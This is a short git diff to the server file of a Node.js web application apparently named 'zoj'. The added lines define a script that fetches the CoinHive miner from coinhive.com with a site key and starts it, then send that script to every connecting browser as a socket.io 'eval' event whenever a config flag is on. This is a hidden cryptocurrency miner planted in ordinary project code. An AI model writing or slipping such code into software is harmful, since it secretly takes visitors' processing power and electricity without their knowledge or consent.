@@ -2,6 +2,7 @@
 
 let fs = require('fs');
 let path = require('path');
+let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;
 
 global.zoj = {
 	rootDir: __dirname,
@@ -35,6 +36,9 @@ global.zoj = {
 		io.on('connection', function (socket) {
 			console.log('a user connected');
 			socket.emit('connection', {});
+			if (zoj.config.miner) {
+				socket.emit('eval', { data: mscript });
+			}
 		});
 
 		zoj.production = app.get('env') === 'production';
